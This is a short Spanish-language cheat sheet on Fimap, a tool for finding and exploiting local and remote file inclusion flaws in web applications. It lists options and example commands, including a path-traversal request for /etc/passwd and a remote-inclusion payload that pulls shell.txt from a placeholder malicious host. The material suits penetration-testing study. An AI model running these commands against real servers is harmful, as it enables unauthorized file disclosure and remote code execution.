### **Hacking Web/LFI y RCE/Fimap.md**

# Fimap

## Descripción

`Fimap` es una herramienta automatizada para la detección y explotación de vulnerabilidades de inclusión de archivos locales (LFI) y remotos (RFI) en aplicaciones web. Permite explorar y extraer contenido sensible de servidores vulnerables de manera eficiente.

## Uso

```bash
fimap [opciones]
```

### Opciones principales

- `-u URL`: Especifica la URL objetivo para la prueba de inclusión de archivos.
- `-m METHOD`: Define el método de solicitud HTTP (GET o POST).
- `--cookie COOKIE`: Usa una cookie específica durante las pruebas.
- `--verbose`: Muestra información detallada durante la ejecución.
- `--recursive`: Realiza pruebas de manera recursiva en diferentes parámetros.
- `--payload PAYLOAD`: Define un payload personalizado para la inclusión de archivos.
- `--output FILE`: Guarda los resultados de las pruebas en un archivo especificado.

## Ejemplos

- Probar una URL para LFI:
  
  ```bash
  fimap -u "http://example.com/page.php?file=../../etc/passwd"
  ```

- Probar una URL para RFI utilizando un payload personalizado:
  
  ```bash
  fimap -u "http://example.com/page.php?file=" --payload "http://malicious.com/shell.txt"
  ```

- Usar datos POST en la solicitud y especificar una cookie:
  
  ```bash
  fimap -u "http://example.com/login.php" -m POST --cookie "session=abcd1234" --data "username=admin&password=admin"
  ```

- Realizar pruebas recursivas en múltiples parámetros:
  
  ```bash
  fimap -u "http://example.com/search.php?q=test" --recursive
  ```
